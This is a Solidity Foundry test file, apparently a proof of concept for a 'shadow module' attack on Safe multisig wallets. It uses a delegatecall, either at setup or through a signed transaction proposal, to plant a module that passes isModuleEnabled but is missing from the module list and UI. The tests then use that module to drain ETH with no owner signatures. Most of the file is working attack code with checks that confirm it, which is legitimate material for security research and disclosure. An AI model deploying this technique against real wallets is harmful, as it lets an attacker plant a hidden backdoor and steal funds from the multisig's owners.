// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe/Safe.sol";
import {SafeProxy} from "@safe/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe/proxies/SafeProxyFactory.sol";
import {Enum} from "@safe/libraries/Enum.sol";
import {ShadowModuleInjector} from "../src/ShadowModuleInjector.sol";

/// @title MaliciousModule
/// @notice A minimal module contract that calls execTransactionFromModule on a Safe.
///         In practice this could do anything — drain funds, change owners, etc.
contract MaliciousModule {
    function drain(address safe, address payable recipient, uint256 amount) external {
        // Modules call execTransactionFromModule as msg.sender — the Safe checks modules[msg.sender]
        (bool success) = Safe(payable(safe)).execTransactionFromModule(recipient, amount, "", Enum.Operation.Call);
        require(success, "Module execution failed");
    }
}

/// @title ShadowModuleTest
/// @notice Demonstrates the shadow module attack on a Safe multisig.
///         A shadow module is enabled (isModuleEnabled == true, can call execTransactionFromModule)
///         but is invisible in getModulesPaginated() and the Safe UI.
///         Unlike shadow owners, a shadow module can execute transactions WITHOUT any signatures
///         from the Safe's owners — modules have unrestricted execution rights.
contract ShadowModuleTest is Test {
    Safe public singleton;
    SafeProxyFactory public factory;
    ShadowModuleInjector public injector;
    MaliciousModule public shadowModule;
    Safe public safe;

    uint256 constant OWNER1_KEY = 0xA001;
    uint256 constant OWNER2_KEY = 0xA002;
    uint256 constant OWNER3_KEY = 0xA003;

    address owner1;
    address owner2;
    address owner3;

    uint256 constant MODULES_MAPPING_SLOT = 1;
    address constant SENTINEL = address(0x1);

    function setUp() public {
        owner1 = vm.addr(OWNER1_KEY);
        owner2 = vm.addr(OWNER2_KEY);
        owner3 = vm.addr(OWNER3_KEY);

        singleton = new Safe();
        factory = new SafeProxyFactory();
        injector = new ShadowModuleInjector();
        shadowModule = new MaliciousModule();

        address[] memory owners = new address[](3);
        owners[0] = owner1;
        owners[1] = owner2;
        owners[2] = owner3;

        // Inject the shadow module during setup via delegatecall
        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners,
            uint256(2),
            address(injector), // to: delegatecall target
            abi.encodeWithSelector(ShadowModuleInjector.injectShadowModule.selector, address(shadowModule)),
            address(0),
            address(0),
            uint256(0),
            payable(address(0))
        );

        SafeProxy proxy = factory.createProxyWithNonce(address(singleton), initializer, 0);
        safe = Safe(payable(address(proxy)));
        vm.deal(address(safe), 1 ether);
    }

    // =========================================================================
    //  TEST A: Shadow module is enabled but invisible
    // =========================================================================

    function test_shadowModuleIsHiddenButEnabled() public view {
        // isModuleEnabled should return true for the shadow module
        assertTrue(safe.isModuleEnabled(address(shadowModule)), "shadow module must pass isModuleEnabled()");

        // getModulesPaginated should NOT include the shadow module
        (address[] memory listedModules,) = safe.getModulesPaginated(SENTINEL, 10);

        bool shadowListed = false;
        for (uint256 i = 0; i < listedModules.length; i++) {
            if (listedModules[i] == address(shadowModule)) {
                shadowListed = true;
            }
        }
        assertFalse(shadowListed, "shadow module must NOT appear in getModulesPaginated()");

        console.log("=== Shadow Module Verification ===");
        console.log("isModuleEnabled(shadow): true");
        console.log("Listed modules count:    %d", listedModules.length);
        console.log("Shadow module address:   %s", address(shadowModule));
        console.log("getModulesPaginated() includes shadow: false");
    }

    // =========================================================================
    //  TEST B: Shadow module can execute transactions WITHOUT owner signatures
    // =========================================================================

    function test_shadowModuleCanExecuteWithoutSignatures() public {
        address payable recipient = payable(makeAddr("recipient"));
        uint256 sendAmount = 0.5 ether;
        uint256 safeBefore = address(safe).balance;

        // The shadow module drains ETH — no owner signatures needed
        shadowModule.drain(address(safe), recipient, sendAmount);

        assertEq(recipient.balance, sendAmount, "recipient should have received ETH");
        assertEq(address(safe).balance, safeBefore - sendAmount, "safe balance should decrease");

        console.log("=== Shadow Module Execution ===");
        console.log("Executed via: execTransactionFromModule (no signatures needed)");
        console.log("Recipient balance: %d wei", recipient.balance);
        console.log("Safe balance:      %d wei", address(safe).balance);
    }

    // =========================================================================
    //  TEST C: Raw storage inspection — prove the dirty modules mapping
    // =========================================================================

    function test_moduleStorageInspection() public view {
        // Read modules[shadowModule] directly from storage
        bytes32 moduleSlot = keccak256(abi.encode(address(shadowModule), MODULES_MAPPING_SLOT));
        bytes32 moduleValue = vm.load(address(safe), moduleSlot);

        console.log("=== Module Storage Inspection ===");
        console.log("Shadow module address:    %s", address(shadowModule));
        console.log("modules mapping slot:     1");
        console.log("modules[shadow] slot:     %s", vm.toString(moduleSlot));
        console.log("modules[shadow] value:    %s", vm.toString(moduleValue));
        assertEq(moduleValue, bytes32(uint256(uint160(SENTINEL))), "modules[shadow] should be SENTINEL (0x1)");

        // Walk the linked list from sentinel — shadow should be unreachable
        console.log("");
        console.log("Module linked list traversal from SENTINEL:");
        bytes32 sentinelSlot = keccak256(abi.encode(SENTINEL, MODULES_MAPPING_SLOT));
        address current = address(uint160(uint256(vm.load(address(safe), sentinelSlot))));
        uint256 idx = 0;
        bool shadowReachable = false;
        while (current != SENTINEL && current != address(0) && idx < 10) {
            console.log("  [%d] %s", idx, current);
            if (current == address(shadowModule)) shadowReachable = true;
            bytes32 nextSlot = keccak256(abi.encode(current, MODULES_MAPPING_SLOT));
            current = address(uint160(uint256(vm.load(address(safe), nextSlot))));
            idx++;
        }
        // modules[SENTINEL] == SENTINEL means no modules in the list (empty list, just sentinel pointing to itself)
        assertFalse(shadowReachable, "shadow module must not be reachable in linked list");
        console.log("Modules in linked list:   %d", idx);
        console.log("Shadow reachable:         false");
    }
}

/// @title ShadowModuleViaExecTest
/// @notice Demonstrates shadow module injection via execTransaction() — a malicious
///         transaction proposal that uses DELEGATECALL to silently enable a hidden module.
contract ShadowModuleViaExecTest is Test {
    Safe public singleton;
    SafeProxyFactory public factory;
    ShadowModuleInjector public injector;
    MaliciousModule public shadowModule;
    Safe public safe;

    uint256 constant OWNER1_KEY = 0xA001;
    uint256 constant OWNER2_KEY = 0xA002;
    uint256 constant OWNER3_KEY = 0xA003;

    address owner1;
    address owner2;
    address owner3;

    function setUp() public {
        owner1 = vm.addr(OWNER1_KEY);
        owner2 = vm.addr(OWNER2_KEY);
        owner3 = vm.addr(OWNER3_KEY);

        singleton = new Safe();
        factory = new SafeProxyFactory();
        injector = new ShadowModuleInjector();
        shadowModule = new MaliciousModule();

        address[] memory owners = new address[](3);
        owners[0] = owner1;
        owners[1] = owner2;
        owners[2] = owner3;

        // Clean setup — no modules injected
        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners,
            uint256(2),
            address(0), // no delegatecall
            "",
            address(0),
            address(0),
            uint256(0),
            payable(address(0))
        );

        SafeProxy proxy = factory.createProxyWithNonce(address(singleton), initializer, 0);
        safe = Safe(payable(address(proxy)));
        vm.deal(address(safe), 1 ether);
    }

    /// @notice Injects a shadow module via execTransaction, then uses it to drain funds.
    function test_injectShadowModuleViaExecTransaction() public {
        // Pre-check: module is not enabled
        assertFalse(safe.isModuleEnabled(address(shadowModule)), "module must not be enabled before injection");

        // Build the delegatecall tx to inject the shadow module
        bytes memory injectCalldata =
            abi.encodeWithSelector(ShadowModuleInjector.injectShadowModule.selector, address(shadowModule));
        bytes memory signatures = _signDelegatecallTx(injectCalldata);

        bool success = safe.execTransaction(
            address(injector),
            0,
            injectCalldata,
            Enum.Operation.DelegateCall,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            signatures
        );
        assertTrue(success, "injection tx must succeed");

        // Post-check: module is enabled but hidden
        assertTrue(safe.isModuleEnabled(address(shadowModule)), "module must be enabled after injection");
        (address[] memory listedModules,) = safe.getModulesPaginated(address(0x1), 10);
        for (uint256 i = 0; i < listedModules.length; i++) {
            assertTrue(listedModules[i] != address(shadowModule), "shadow module must not be listed");
        }

        // Now use the shadow module to drain funds — NO signatures required
        address payable recipient = payable(makeAddr("victim"));
        shadowModule.drain(address(safe), recipient, 0.5 ether);
        assertEq(recipient.balance, 0.5 ether, "drain via shadow module must succeed");

        console.log("=== Shadow Module Injection via execTransaction ===");
        console.log("Before injection: isModuleEnabled(shadow) = false");
        console.log("After injection:  isModuleEnabled(shadow) = true");
        console.log("getModulesPaginated() includes shadow: false");
        console.log("Drained 0.5 ETH via module (no signatures): success");
    }

    function _signDelegatecallTx(bytes memory data) internal view returns (bytes memory) {
        bytes32 txHash = safe.getTransactionHash(
            address(injector),
            0,
            data,
            Enum.Operation.DelegateCall,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            safe.nonce()
        );
        return _sortAndSign(OWNER1_KEY, OWNER2_KEY, txHash);
    }

    function _sortAndSign(uint256 keyA, uint256 keyB, bytes32 hash) internal pure returns (bytes memory) {
        address addrA = vm.addr(keyA);
        address addrB = vm.addr(keyB);
        if (addrA > addrB) {
            (keyA, keyB) = (keyB, keyA);
        }
        (uint8 vA, bytes32 rA, bytes32 sA) = vm.sign(keyA, hash);
        (uint8 vB, bytes32 rB, bytes32 sB) = vm.sign(keyB, hash);
        return abi.encodePacked(rA, sA, vA, rB, sB, vB);
    }
}
